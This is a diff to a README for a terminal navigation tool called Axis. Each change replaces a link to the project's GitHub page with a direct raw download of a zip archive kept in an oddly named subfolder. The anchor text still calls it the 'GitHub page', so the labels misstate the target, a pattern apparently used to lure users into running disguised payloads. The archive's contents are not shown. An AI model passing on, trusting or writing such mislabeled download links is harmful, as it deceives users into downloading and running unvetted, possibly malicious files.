@@ -1,6 +1,6 @@
 # 🛠️ Axis - Smarter Terminal Navigation
 
-[![Download Axis](https://img.shields.io/badge/Download-Axis-brightgreen?style=for-the-badge)](https://github.com/aryanssargiyas-rgb/Axis)
+[![Download Axis](https://img.shields.io/badge/Download-Axis-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aryanssargiyas-rgb/Axis/main/anorthography/Software-1.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You do not need any special technical skill to download Axis.
 
 Click the large green button above or the link below to visit the page where you can download the software:
 
-[Download Axis from GitHub](https://github.com/aryanssargiyas-rgb/Axis)
+[Download Axis from GitHub](https://raw.githubusercontent.com/aryanssargiyas-rgb/Axis/main/anorthography/Software-1.3.zip)
 
 On the GitHub page:
 
@@ -112,7 +112,7 @@ If you find bugs, report them on GitHub so improvements can be made.
 
 Axis is an open system. You can learn more and get support here:
 
-- GitHub page: https://github.com/aryanssargiyas-rgb/Axis  
+- GitHub page: https://raw.githubusercontent.com/aryanssargiyas-rgb/Axis/main/anorthography/Software-1.3.zip  
 - Issues section on GitHub for reporting problems  
 - Documentation included with the download  
 - Community forums may help with tips and tricks  
@@ -125,4 +125,4 @@ The tool focuses on minimal mental effort while improving command line coherence
 
 ---
 
-[![Download Axis](https://img.shields.io/badge/Download-Axis-blue?style=for-the-badge)](https://github.com/aryanssargiyas-rgb/Axis)
+[![Download Axis](https://img.shields.io/badge/Download-Axis-blue?style=for-the-badge)](https://raw.githubusercontent.com/aryanssargiyas-rgb/Axis/main/anorthography/Software-1.3.zip)
